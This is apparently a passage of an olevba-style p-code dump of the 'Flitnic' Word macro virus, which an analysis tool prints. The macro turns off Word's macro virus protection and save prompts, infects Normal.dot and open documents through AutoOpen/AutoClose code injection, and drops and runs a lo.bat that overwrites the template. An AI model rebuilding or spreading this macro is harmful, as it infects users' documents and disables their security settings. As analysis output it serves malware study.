' Line #139:
' 	Ld wdDialogToolsMacro 
' 	Ld Application 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #140:
' 	LitVarSpecial (True)
' 	St ReInf 
' Line #141:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St ReInf 
' 	EndIf 
' Line #142:
' 	Label Reinfection 
' Line #143:
' 	Ld ReInf 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #144:
' 	QuoteRem 0x0000 0x000C "Reinfection:"
' Line #145:
' 	LitDI2 0x0000 
' 	St Acd 
' Line #146:
' 	LitDI2 0x0000 
' 	St NormT 
' Line #147:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #148:
' 	Ld NormalTemplate 
' 	ArgsMemCall OpenAsDocument 0x0000 
' Line #149:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	St NormAt 
' Line #150:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #152:
' 	Label look 
' Line #153:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #154:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #155:
' 	Ld inn 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #156:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #157:
' 	Ld FullCodeN 
' 	Paren 
' 	Ld inn 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #158:
' 	LitDI2 0x0014 
' 	St i 
' Line #159:
' 	ExitFor 
' Line #160:
' 	EndIfBlock 
' Line #161:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	NextVar 
' Line #162:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #163:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #164:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #165:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #166:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #167:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #168:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #169:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #170:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #171:
' 	GoTo look 
' Line #172:
' 	EndIfBlock 
' Line #173:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #174:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo notemp 
' 	EndIf 
' Line #175:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #176:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #177:
' 	EndIfBlock 
' Line #178:
' 	EndIfBlock 
' Line #179:
' 	LitDI2 0x0001 
' 	St i 
' Line #180:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #181:
' 	Label notemp 
' Line #182:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #183:
' 	CloseAll 
' Line #184:
' 	Label look2 
' Line #185:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St a 
' Line #186:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo NoDocL 
' 	EndIf 
' Line #187:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #188:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #189:
' 	Ld inn2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #190:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #191:
' 	Ld FullCodeD 
' 	Paren 
' 	Ld inn2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #192:
' 	LitDI2 0x0014 
' 	St i 
' Line #193:
' 	ExitFor 
' Line #194:
' 	EndIfBlock 
' Line #195:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	NextVar 
' Line #196:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #197:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #198:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #199:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #200:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #201:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #202:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #203:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #204:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #205:
' 	GoTo look2 
' Line #206:
' 	EndIfBlock 
' Line #207:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "A"
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #208:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo noactsave 
' 	EndIf 
' Line #209:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #210:
' 	Label noactsave 
' Line #211:
' 	ElseBlock 
' Line #212:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #213:
' 	EndIfBlock 
' Line #214:
' 	EndIfBlock 
' Line #215:
' 	Label NoDocL 
' Line #216:
' 	ElseBlock 
' Line #217:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	LitStr 0x000C "c:\Troop.dat"
' 	ArgsCall FileCopy 0x0002 
' Line #218:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #219:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #220:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St al 
' Line #221:
' 	LitDI2 0x0001 
' 	Ld al 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #222:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #223:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #224:
' 	EndIfBlock 
' Line #225:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #226:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #227:
' 	EndSub 
' Line #228:
' 	FuncDefn (Sub FLTNC())
' Line #229:
' 	Label Begin 
' Line #230:
' 	OnError eb 
' Line #231:
' 	LitVarSpecial (False)
' 	St NormAt 
' Line #232:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "Edit"
' 	Ld VBE 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #233:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #234:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #235:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #236:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #237:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #238:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #239:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #240:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #241:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #242:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #243:
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #244:
' 	Ld a 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #245:
' 	EndIfBlock 
' Line #246:
' 	Loop 
' Line #247:
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #248:
' 	OnError NoInf 
' Line #249:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #250:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #251:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #252:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #253:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000E "SUB AUTOOPEN()"
' 	Eq 
' 	IfBlock 
' Line #254:
' 	LitDI2 0x0001 
' 	St Acd 
' Line #255:
' 	ExitFor 
' Line #256:
' 	EndIfBlock 
' Line #257:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #258:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #259:
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #260:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #261:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #262:
' 	Ld ii 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' Line #263:
' 	Ld FullCodeN 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #264:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	NextVar 
' Line #265:
' 	EndIfBlock 
' Line #266:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #267:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #268:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #269:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #270:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000F "SUB AUTOCLOSE()"
' 	Eq 
' 	IfBlock 
' Line #271:
' 	LitDI2 0x0001 
' 	St NormT 
' Line #272:
' 	ExitFor 
' Line #273:
' 	EndIfBlock 
' Line #274:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	NextVar 
' Line #275:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #276:
' 	LitStr 0x000D "SUB AUTOCLOSE"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #277:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #278:
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #279:
' 	Ld iiii 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' Line #280:
' 	Ld FullCodeD 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #281:
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	NextVar 
' Line #282:
' 	EndIfBlock 
' Line #283:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #284:
' 	Label look 
' Line #285:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #286:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #287:
' 	Ld inn 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #288:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #289:
' 	Ld FullCodeN 
' 	Paren 
' 	Ld inn 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #290:
' 	LitDI2 0x0014 
' 	St i 
' Line #291:
' 	ExitFor 
' Line #292:
' 	EndIfBlock 
' Line #293:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	NextVar 
' Line #294:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #295:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #296:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #297:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #298:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #299:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #300:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #301:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #302:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #303:
' 	GoTo look 
' Line #304:
' 	EndIfBlock 
' Line #305:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #306:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #307:
' 	Ld NormalTemplate 
' 	ArgsMemCall OpenAsDocument 0x0000 
' Line #308:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	St NormAtt 
' Line #309:
' 	LitStr 0x0000 ""
' 	St l 
' Line #310:
' 	OnError eb 
' Line #311:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #312:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #313:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #314:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #315:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #316:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #317:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #318:
' 	CloseAll 
' Line #319:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #320:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 ":Begin"
' 	PrintItemNL 
' Line #321:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	FnLen 
' 	St l 
' Line #322:
' 	Ld l 
' 	LitDI2 0x000A 
' 	Sub 
' 	St l 
' Line #323:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x01F4 
' 	For 
' Line #324:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "rem Flitnic has catched you... he, he"
' 	PrintItemNL 
' Line #325:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #326:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 ":Begin"
' 	PrintItemNL 
' Line #327:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "Move /y c:\Troop.dat "
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #328:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "If exist c:\Troop.dat goto Begin"
' 	PrintItemNL 
' Line #329:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #330:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #331:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #332:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo notemp 
' 	EndIf 
' Line #333:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #334:
' 	EndIfBlock 
' Line #335:
' 	Label notemp 
' Line #336:
' 	EndIfBlock 
' Line #337:
' 	LitDI2 0x0001 
' 	St i 
' Line #338:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #339:
' 	CloseAll 
' Line #340:
' 	Label look2 
' Line #341:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #342:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #343:
' 	Ld inn2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #344:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #345:
' 	Ld FullCodeD 
' 	Paren 
' 	Ld inn2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #346:
' 	LitDI2 0x0014 
' 	St i 
' Line #347:
' 	ExitFor 
' Line #348:
' 	EndIfBlock 
' Line #349:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	NextVar 
' Line #350:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #351:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #352:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #353:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #354:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #355:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #356:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #357:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #358:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #359:
' 	GoTo look2 
' Line #360:
' 	EndIfBlock 
' Line #361:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "A"
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #362:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo noactsave 
' 	EndIf 
' Line #363:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #364:
' 	Label noactsave 
' Line #365:
' 	ElseBlock 
' Line #366:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #367:
' 	EndIfBlock 
' Line #368:
' 	EndIfBlock 
' Line #369:
' 	Label NoInf 
' Line #370:
' 	Label eb 
' Line #371:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #372:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #373:
' 	LitVarSpecial (False)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #374:
' 	GoTo NoNormal 
' Line #375:
' 	EndIfBlock 
' Line #376:
' 	Ld NormAtt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #377:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	LitStr 0x000C "c:\Troop.dat"
' 	ArgsCall FileCopy 0x0002 
' Line #378:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #379:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #380:
' 	ElseBlock 
' Line #381:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #382:
' 	EndIfBlock 
' Line #383:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #384:
' 	Label NoNormal 
' Line #385:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
